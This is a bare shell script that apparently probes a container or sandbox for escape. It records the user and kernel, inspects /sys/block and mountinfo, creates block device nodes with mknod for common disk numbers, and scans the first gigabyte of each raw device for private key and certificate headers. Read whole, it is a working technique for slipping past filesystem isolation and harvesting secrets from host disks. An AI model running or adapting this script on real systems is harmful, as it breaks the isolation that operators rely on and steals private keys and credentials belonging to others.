set -u
P(){ echo "### $*"; }
P UID; id; uname -a
P SYS_BLOCK
ls -la /sys/block 2>&1 | head -20
for f in /sys/block/*/dev /sys/block/*/size; do [ -f "$f" ] && { printf '%s=' "$f"; cat "$f" 2>&1; }; done
P MOUNTINFO
grep -E ' / | /etc/hosts | /etc/resolv.conf ' /proc/self/mountinfo 2>&1 | head -8
P MKNOD
mknod /tmp/n0 c 1 3 2>&1 && echo MKNOD_CHAR_OK || echo MKNOD_CHAR_FAIL
for d in "254 0" "254 1" "254 16" "253 0" "252 0" "8 0" "259 0"; do
  set -- $d; n=/tmp/b_$1_$2; rm -f "$n"
  if mknod "$n" b "$1" "$2" 2>/tmp/e; then
    echo -n "$1:$2 mknod_ok firstbytes: "; head -c 16 "$n" 2>&1 | od -An -tx1 | head -1
  else echo "$1:$2 mknod_fail $(head -1 /tmp/e)"; fi
done
P SCAN
for n in /tmp/b_*; do
  [ -b "$n" ] || continue
  echo "-- $n"
  head -c 1073741824 "$n" 2>/dev/null | grep -abo -E 'BEGIN (RSA |EC |OPENSSH |)PRIVATE KEY|BEGIN CERTIFICATE' | head -6
  echo "-- done $n"
done
P DONE
